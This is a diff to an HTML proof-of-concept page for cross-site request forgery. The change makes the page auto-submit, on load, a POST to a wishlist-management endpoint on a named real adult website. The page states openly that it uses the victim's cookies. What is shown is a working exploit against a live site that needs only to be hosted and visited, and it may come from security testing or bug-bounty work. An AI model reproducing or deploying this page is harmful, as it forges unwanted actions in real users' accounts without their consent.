@@ -4,12 +4,18 @@
     <title>CSRF PoC</title>
   </head>
   <body>
-    <h1>CSRF Test</h1>
-    <p>Click the button to trigger the POST request.</p>
+    <h1>CSRF Test with JavaScript</h1>
+    <p>This will automatically submit a POST request using the victim's cookies.</p>
 
-    <form action="https://www.mydirtyhobby.com/wishlist/manage/item/12711281/1" method="POST">
-      <!-- No parameters needed for this request -->
-      <input type="submit" value="Add/Remove Wishlist Item">
+    <form id="csrfForm" action="https://www.mydirtyhobby.com/wishlist/manage/item/12711281/1" method="POST">
+      <input type="submit" value="Click to trigger manually">
     </form>
+
+    <script>
+      // Automatically submit the form after page load
+      window.onload = function() {
+        document.getElementById('csrfForm').submit();
+      };
+    </script>
   </body>
 </html>
